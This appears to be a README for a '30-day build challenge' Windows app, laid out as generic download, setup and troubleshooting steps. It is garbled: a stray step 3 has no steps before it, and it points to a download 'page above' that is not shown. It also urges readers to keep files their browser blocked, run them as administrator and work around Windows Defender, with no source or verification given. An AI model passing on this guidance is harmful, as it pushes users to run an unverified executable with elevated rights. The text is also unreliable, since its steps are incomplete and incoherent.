## 📦 What this is

buildcored-orcas is a 30-day build challenge for people who want to ship real work every day. Each day gives you one project to build across software, AI, systems, and applied engineering.

This is a Windows-friendly project guide for people who want to download the app, open it, and start using it without much setup. It is built for people who prefer clear steps over long explanations.

## 🖥️ What you need

Before you start, make sure your PC can handle a simple desktop app and local tools used by the challenge.

- Windows 10 or Windows 11
- 4 GB RAM or more
- 2 GB free disk space
- Internet access for the first download
- A mouse and keyboard
- Admin access if Windows asks for permission

If you plan to use local AI tasks, a newer PC will feel smoother. If you only want the daily project flow, most modern Windows laptops will work.

3. Set up the files.

If a day includes AI work, you may see terms like model, prompt, or local runtime. These usually mean the app is asking you to run or test a tool on your own PC. If a day includes hardware or systems work, the task may focus on simple control, input, output, or small device behavior.

## 🪟 Windows file tips

Windows can hide file types and extensions. That can make setup harder than it should be. Use these tips:

- Turn on file extensions in File Explorer
- Keep the downloaded file in Downloads until it works
- Do not move files around during setup
- If a ZIP file will not open, right-click it and try Extract All
- If the app does not open, try Run as administrator

If your browser blocks the download, choose Keep or Save when asked.

## 🔍 If the app does not open

Try these steps in order:

1. Right-click the file and choose Open.
2. Run it as administrator.
3. Check whether Windows Defender blocked it.
4. Make sure the file finished downloading.
5. Extract the ZIP file again.
6. Reboot the PC and try once more.

If the app still does not start, check that you downloaded the full file from the page above and not a web page link.

## ❓ Common questions

### Is this for beginners?

Yes. You do not need a programming background to start. The app should guide you through one day at a time.

### Do I need to finish all 30 days at once?

No. You should treat each day as one small unit. Finish one day, then move to the next.

### Can I use this without special hardware?

Yes. Many tasks can run on a normal Windows PC. Some challenge days may point to hardware ideas, but you can still follow the flow on a regular machine.

### Is internet required?

You need internet for the first download. After that, some tasks may work offline, while others may need web access or local tools.

### What if I miss a day?

The challenge is strict by design. If you skip a day, you should check the app or repo rules for the current state of your challenge run.
